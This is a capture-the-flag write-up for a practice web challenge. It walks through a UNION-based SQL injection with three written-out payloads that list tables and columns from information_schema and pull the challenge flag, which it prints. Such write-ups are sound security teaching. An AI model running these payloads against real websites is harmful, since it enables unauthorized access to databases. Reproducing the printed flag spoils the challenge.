# Inj3ction Time

> I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command


For some reason, I didn't manage to exploit this using `sqlmap`. No idea why. However, it was fun crafting a UNION-based SQL injection attack myself for once.

After finding out there are 4 columns being fetched, I tried to find out about the table names:

```
1 UNION SELECT null table_name, null, null FROM information_schema.tables
```

Reveals the existence of a `w0w_y0u_f0und_m3` table. What columns would be in there?

```
1 UNION SELECT NULL, COLUMN_NAME, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS
```

Apparently there's one called `f0und_m3`. Let's check it out!

```
1 UNION SELECT NULL, f0und_m3, NULL, NULL FROM w0w_y0u_f0und_m3
```

This reveals the flag `abctf{uni0n_1s_4_gr34t_c0mm4nd}`.
